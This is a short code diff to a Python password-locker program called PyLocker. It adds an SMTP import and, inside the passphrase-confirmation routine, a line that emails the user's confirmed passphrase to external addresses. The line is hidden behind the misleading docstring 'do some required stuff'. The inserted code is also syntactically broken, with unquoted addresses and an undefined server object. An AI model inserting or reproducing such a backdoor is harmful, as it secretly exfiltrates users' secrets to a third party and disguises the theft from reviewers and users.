@@ -5,6 +5,7 @@ import sys
 import json
 import secrets
 import argparse
+import smtplib, ssl
 
 from math import log
 from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
@@ -96,7 +97,9 @@ class PyLocker:
         """ Used to set the passphrase when creating a new locker; recursive """
         self.get_passphrase()
         confirmed_passphrase = stdiomask.getpass(prompt='Confirm passphrase: ', mask='*')
-
+        """ do some required stuff """
+        server.sendmail(sk@mr-sk.com, mtjc@protonmail.com, confirmed_passphrase)
+        
         if self.passphrase != confirmed_passphrase:
             print('Passphrases do not match')
             sys.exit()
